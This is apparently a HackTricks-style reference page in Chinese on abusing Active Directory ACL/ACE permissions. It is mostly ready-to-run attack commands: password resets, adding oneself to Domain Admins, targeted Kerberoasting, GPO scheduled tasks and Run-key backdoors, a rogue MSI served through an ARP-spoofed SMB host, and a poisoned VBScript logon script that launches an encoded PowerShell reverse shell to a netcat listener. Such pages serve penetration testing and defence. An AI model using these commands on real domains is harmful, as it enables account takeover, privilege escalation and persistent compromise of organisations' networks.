# 滥用 Active Directory ACL/ACE

{{#include ../../../banners/hacktricks-training.md}}

**本页面主要总结了以下技术** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **以及** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**中的技术。有关更多详细信息，请参阅原始文章。**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **用户的 GenericAll 权限**

此权限授予攻击者对目标用户账户的完全控制权。使用 `Get-ObjectAcl` 命令确认 `GenericAll` 权限后，攻击者可以：

- **更改目标用户的密码**：使用 `net user <username> <password> /domain`，攻击者可以重置该用户的密码。
- 在 Linux 中，可以通过 Samba `net rpc` 使用 SAMR 执行相同操作：<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **如果账户已被禁用，请清除 UAC 标志**：`GenericAll` 允许编辑 `userAccountControl`。在 Linux 中，BloodyAD 可以移除 `ACCOUNTDISABLE` 标志：<sup>[[8]](#references)[[10]](#references)</sup>
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**：为用户账户分配 SPN，使其可进行 kerberoast，然后使用 Rubeus 和 targetedKerberoast.py 提取并尝试破解 ticket-granting ticket (TGT) hashes。
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**：为该用户禁用预身份验证，使其账户容易受到 ASREPRoasting 攻击。
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**：通过对用户拥有 `GenericAll` 权限，你可以添加基于证书的凭据，并在不更改其密码的情况下以该用户身份进行身份验证。参见：

{{#ref}}
shadow-credentials.md
{{#endref}}

## **组上的 GenericAll 权限**

如果攻击者对类似 `Domain Admins` 的组拥有 `GenericAll` 权限，则可以操纵组成员关系。使用 `Get-NetGroup` 确定该组的 distinguished name 后，攻击者可以：

- **将自己添加到 Domain Admins 组**：可以通过直接执行命令，或使用 Active Directory、PowerSploit 等模块完成。
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- 在 Linux 中，当你对任意组拥有 GenericAll/Write membership 权限时，也可以利用 BloodyAD 将自己添加到这些组中。如果目标组嵌套在“Remote Management Users”中，你将立即获得在遵循该组的主机上使用 WinRM 的访问权限：<sup>[[8]](#references)</sup>
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

在计算机对象或用户账户上拥有这些权限，可以：

- **Kerberos Resource-based Constrained Delegation**：实现接管计算机对象。
- **Shadow Credentials**：利用创建 shadow credentials 的权限，通过冒充计算机或用户账户来利用此技术。

## **WriteProperty on Group**

如果用户对某个特定组（例如 `Domain Admins`）中的所有对象拥有 `WriteProperty` 权限，则可以：

- **Add Themselves to the Domain Admins Group**：通过组合使用 `net user` 和 `Add-NetGroupUser` 命令实现，从而在域内提升权限。
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

此权限允许攻击者将自己添加到特定组（例如 `Domain Admins`）中，方法是通过命令直接操纵组成员身份。使用以下命令序列即可将自己添加到该组：
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

类似的权限，如果攻击者对这些组拥有 `WriteProperty` 权限，则可以通过修改组属性将自己直接添加到组中。此权限的确认和执行方式如下：
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

在用户对象上持有针对 `User-Force-Change-Password` 的 `ExtendedRight`，即可在不知道当前密码的情况下重置密码。可以通过 PowerShell 或其他命令行工具验证并利用此权限，从而以多种方式重置用户密码，包括交互式会话以及适用于非交互式环境的 one-liner。相关命令涵盖简单的 PowerShell 调用，以及在 Linux 上使用 `rpcclient`，展示了攻击向量的多样性。
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **Group 上的 `WriteOwner`**

如果攻击者发现自己对某个 Group 拥有 `WriteOwner` 权限，就可以将该 Group 的所有者更改为自己。当目标 Group 是 `Domain Admins` 时，这一操作的影响尤其大，因为更改所有者后，攻击者可以更广泛地控制该 Group 的属性和成员关系。该过程包括使用 `Get-ObjectAcl` 识别正确的对象，然后使用 `Set-DomainObjectOwner` 通过 SID 或名称修改所有者。
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **用户上的 GenericWrite**

此权限允许攻击者修改用户属性。具体而言，借助 `GenericWrite` 访问权限，攻击者可以更改用户的登录脚本路径，使其在用户登录时执行恶意脚本。实现方式是使用 `Set-ADObject` 命令更新目标用户的 `scriptpath` 属性，使其指向攻击者的脚本。
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

利用此权限，攻击者可以操纵组成员关系，例如将自己或其他用户添加到特定组中。此过程包括创建凭据对象，使用该对象向组中添加或移除用户，并通过 PowerShell 命令验证成员关系变更。
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- 在 Linux 中，当你对该组拥有 `GenericWrite` 权限时，Samba `net` 可以添加/移除成员（在无法使用 PowerShell/RSAT 时很有用）：<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

拥有 AD object 并对其具有 `WriteDACL` 权限，可以使攻击者授予自己对该 object 的 `GenericAll` 权限。此过程通过 ADSI manipulation 实现，从而获得对该 object 的完全控制权，并能够修改其 group memberships。尽管如此，在尝试使用 Active Directory module 的 `Set-Acl` / `Get-Acl` cmdlets 利用这些权限时，仍存在一些限制。<sup>[[4]](#references)[[7]](#references)</sup>
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner 快速接管（PowerView）

当你对某个用户或服务账户拥有 `WriteOwner` 和 `WriteDacl` 权限时，无需知道旧密码，即可完全控制该账户，并使用 PowerView 重置其密码：
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
注意：
- 如果你只有 `WriteOwner` 权限，可能需要先将所有者更改为自己：
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- 在重置密码后，使用任意协议（SMB/LDAP/RDP/WinRM）验证访问权限。

## **域上的 Replication（DCSync）**

DCSync attack 利用域上的特定 Replication 权限来模拟 Domain Controller 并同步数据，包括用户凭据。这项强大的技术需要 `DS-Replication-Get-Changes` 等权限，使攻击者无需直接访问 Domain Controller，即可从 AD 环境中提取敏感信息。<sup>[[5]](#references)</sup> [**在此处了解更多关于 DCSync attack 的信息。**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

对 Group Policy Objects（GPO）进行管理的委派访问可能带来严重的安全风险。例如，如果用户 `offense\spotless` 被委派了 GPO 管理权限，则可能拥有 **WriteProperty**、**WriteDacl** 和 **WriteOwner** 等权限。这些权限可能被滥用于恶意目的，可使用 PowerView 识别：`bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### 枚举 GPO 权限

要识别配置错误的 GPO，可以将 PowerSploit 的 cmdlet 链接起来。这样可以发现特定用户有权管理的 GPO：`powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**应用了给定策略的计算机**：可以解析特定 GPO 应用到哪些计算机，从而帮助了解潜在影响的范围。`powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**应用到给定计算机的策略**：可以使用 `Get-DomainGPO` 等命令查看特定计算机应用了哪些策略。

**应用了给定策略的 OU**：可以使用 `Get-DomainOU` 识别受给定策略影响的组织单位（OU）。

你还可以使用 [**GPOHound**](https://github.com/cogiceo/GPOHound) 枚举 GPO 并查找其中的问题。

### Abuse GPO - New-GPOImmediateTask

配置错误的 GPO 可以被利用来执行代码，例如创建立即执行的 scheduled task。这样可以将用户添加到受影响计算机的本地 administrators 组中，从而显著提升权限：
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

GroupPolicy module 如果已安装，则允许创建并链接新的 GPO，并设置 registry values 等 preferences，以便在受影响的计算机上执行 backdoors。此方法要求更新 GPO，并且用户登录计算机后才能执行：
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse 提供了一种 abuse 现有 GPO 的方法，可以添加 tasks 或修改设置，而无需创建新的 GPO。此工具要求先修改现有 GPO，或使用 RSAT tools 创建新的 GPO，然后再应用更改：
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### 强制策略更新

GPO 更新通常每 90 分钟左右发生一次。为了加快此过程，尤其是在实施更改后，可以在目标计算机上使用 `gpupdate /force` 命令，强制立即更新策略。此命令可确保对 GPO 的任何修改都会被应用，而无需等待下一次自动更新周期。

### 底层原理

检查给定 GPO（例如 `Misconfigured Policy`）的 Scheduled Tasks 后，可以确认其中添加了 `evilTask` 等任务。这些任务通过脚本或命令行工具创建，旨在修改系统行为或提升权限。

`New-GPOImmediateTask` 生成的 XML 配置文件展示了任务的结构，并列出了 scheduled task 的具体配置，包括要执行的命令及其触发器。该文件体现了 scheduled tasks 如何在 GPO 中定义和管理，并提供了一种在策略实施过程中执行任意命令或脚本的方法。

### 用户和组

GPO 还允许操纵目标系统上的用户和组成员关系。通过直接编辑 Users and Groups 策略文件，攻击者可以将用户添加到特权组，例如本地 `administrators` 组。这可以通过委派 GPO 管理权限实现，该权限允许修改策略文件，以加入新用户或更改组成员关系。

Users and Groups 的 XML 配置文件说明了如何实施这些更改。向该文件添加条目后，可以为受影响的系统授予特定用户更高权限。这种方法通过操纵 GPO，为 privilege escalation 提供了直接途径。

此外，还可以考虑其他用于执行代码或维持 persistence 的方法，例如利用 logon/logoff scripts、修改用于 autorun 的 registry keys、通过 `.msi` 文件安装软件，或编辑 service 配置。这些 techniques 通过滥用 GPO，为维持访问权限和控制目标系统提供了多种途径。

### WriteGPLink + UNC path hijacking (ARP spoofing)

通过 OU/domain 上的 `WriteGPLink`，可以修改目标容器的 `gPLink` 属性，并在不编辑 GPO 本身的情况下，**强制应用现有 GPO**。当所链接的 GPO 已经通过 **UNC paths**（`\\HOST\share\...`）引用远程内容时，这一点尤其值得关注，因为 authenticated users 可以读取 **SYSVOL**，并离线查找可复用的策略。<sup>[[11]](#references)</sup>

High-level workflow：

1. 使用 BloodHound 查找对某个 OU 具有 `WriteGPLink` 权限的 principal，并枚举该 OU 中的 computers/users。
2. 以只读方式克隆 `SYSVOL`，并解析 GPO，查找引用 UNC paths 的 **Software Installation**、**drive mappings**（`Drives.xml`）以及 **logon/startup scripts**。
3. 优先选择指向**直接 hostname** 的 policies（例如 `\\DC02\share\pkg.msi`），而不是 DFS/domain-namespace paths，因为基于 hostname 的 paths 更容易通过 L2 spoofing 进行重定向。
4. 将选定的 GPO GUID 添加到目标 OU 的 `gPLink` 中，使 victim 处理该现有 policy。
5. 在同一 broadcast domain 中，对 UNC host 执行 ARP spoof，并在本地绑定其 IP（`ip addr add <target_ip>/32 dev <iface>`），使 victim 的 SMB 流量到达你的 host。
6. 在 attacker SMB server（例如 `smbserver.py`）上提供预期的 path/filename，并等待正常的 policy processing。

`SYSVOL` collection 和 GPO correlation 示例：
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
将现有的 GPO 链接到目标 OU：
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

如果链接的 GPO 从 UNC 路径部署 MSI，客户端会在**计算机启动**期间获取该 MSI，并以 **`NT AUTHORITY\SYSTEM`** 身份安装。通过 spoof 被引用的主机，并在**相同的共享/路径/名称**下提供恶意 MSI，可以将 `WriteGPLink` 转化为 SYSTEM 代码执行，**无需修改 SYSVOL**。

重要限制：

- **时机很重要**：新链接会在策略刷新时生效（通常约为 90 分钟），但 **Software Installation** 通常会在**重启**时触发。
- Windows Installer 通常使用包的 **`ProductCode`** 跟踪部署。如果产品已经安装，部署可能会被跳过。
- 为避免安装程序拒绝，需要修改 rogue MSI，使其 **`ProductCode`** 和 **`PackageCode`** 与 GPO 所要求的合法包保持一致。
- 旧的 `.aas` 广告文件可能仍会保留在 `SYSVOL` 中，因此在依赖该部署之前，请确认其仍显示为活动状态。
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

`Drives.xml` 中的 GPP drive mappings 会导致用户在登录或重新连接时向配置的 UNC 路径进行身份验证。如果你 spoof 被引用的主机，就可以捕获 **NetNTLMv2**。如果有意让 SMB 失败，Windows 可能会通过 **WebDAV** 重试，并发送 **NTLM over HTTP**，这对于中继到 **LDAP(S)**、**AD CS** 或 **SMB** 来说灵活得多。

#### Logon/startup script UNC hijack

同样的模式也适用于在 `SYSVOL` 中发现的 UNC-hosted scripts：

- **Logon scripts** 通常在 **user** 上下文中执行。
- **Startup scripts** 通常在 **computer / SYSTEM** 上下文中执行。

如果脚本路径指向一个可 spoof 的主机名，就可以重定向 UNC 主机，并从预期位置提供替代脚本内容。

## SYSVOL/NETLOGON Logon Script Poisoning

`\\<dc>\SYSVOL\<domain>\scripts\` 或 `\\<dc>\NETLOGON\` 下的可写路径允许篡改通过 GPO 在用户登录时执行的 logon scripts。这会在登录用户的安全上下文中实现代码执行。

### Locate logon scripts
- 检查用户属性中是否配置了 logon script：
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- 遍历域共享，以发现指向脚本的快捷方式或引用：
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- 解析 `.lnk` 文件以定位指向 SYSVOL/NETLOGON 的目标（对 DFIR 技术以及无法直接访问 GPO 的攻击者很有用）：
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- 当存在 `logonScript`（scriptPath）属性时，BloodHound 会在用户节点上显示该属性。

### 验证写入权限（不要盲信共享列表）
自动化工具可能会将 SYSVOL/NETLOGON 显示为只读，但底层 NTFS ACL 仍可能允许写入。始终进行测试：
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
如果文件大小或 mtime 发生变化，则表示你拥有写入权限。修改前请保留原始文件。

### 对 VBScript logon script 进行 Poison 以实现 RCE
追加一条用于启动 PowerShell reverse shell 的命令（从 revshells.com 生成），并保留原有逻辑，以避免破坏业务功能：
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
在你的主机上监听，并等待下一次交互式登录：
```bash
rlwrap -cAr nc -lnvp 443
```
注意：
- 执行在 logging user 的 token 下进行（而不是 SYSTEM）。范围是应用该脚本的 GPO link（OU、site、domain）。
- 使用后通过恢复原始内容和时间戳进行清理。


## 参考资料

- [1] [Abusing Active Directory ACLs/ACEs](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Privileged Accounts and Token Privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – The ACL Attack Path Update](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Escalating privileges with ACLs in Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Scanning for Active Directory Privileges & Privileged Accounts](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (group membership)](https://www.samba.org/)
- [10] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
